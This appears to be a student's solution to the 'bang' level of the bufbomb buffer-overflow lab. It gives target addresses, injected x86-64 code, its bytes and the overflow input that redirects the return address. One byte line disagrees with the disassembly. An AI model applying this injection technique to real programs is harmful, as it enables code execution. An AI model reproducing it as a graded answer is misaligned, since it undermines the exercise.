# (gdb) info stack
#0  getbuf () at bufbomb.c:132
#1  0x0000000000400ef3 in test () at bufbomb.c:108
#2  0x0000000000400fdd in launch (offset=offset@entry=848, nitro=0) at bufbomb.c:343
#3  0x0000000000400a59 in main (argc=3, argv=<optimized out>) at bufbomb.c:454


# global_value address:  0000000000602308
# cookie address:        0000000000602320 
# bang function address: 0000000000401020


# instructions to set global value to cookie and run bang
mov  0x602320, %r9
mov  %r9, 0x602308
push $0x401020
retq

# Disassembly of above code:
#  0000000000000000 <.text>:
#     0:	4c 8b 0c 25 20 23 60 	mov    0x602320,%r9
#     7:	00 
#     8:	4c 89 0c 25 08 23 60 	mov    %r9,0x602308
#     f:	00 
#    10:	68 20 10 40 00       	pushq  $0x401020
#    17:	c3                   	retq  

# Byte code:
# 4c 8b 0c 25 20 23 60 00 4c 89 0c 25 08 23 60 00 ff 34 25 20 10 40 00 c3


# Input (in space-separated bytes) is:
# 4c 8b 0c 25 20 23 60 00      4c 89 0c 25 08 23 60 00 
# 68 20 10 40 00 c3 00 00      e5 48 21 d5 3d 00 00 00
# 50 25 00 00 00 00 00 00      77 a4 6b d5 3d 00 00 00  
# 90 bc ff ff ff 7f 00 00      30 bc ff ff ff 7f 00 00 // return address (0x7fffffffbc30)

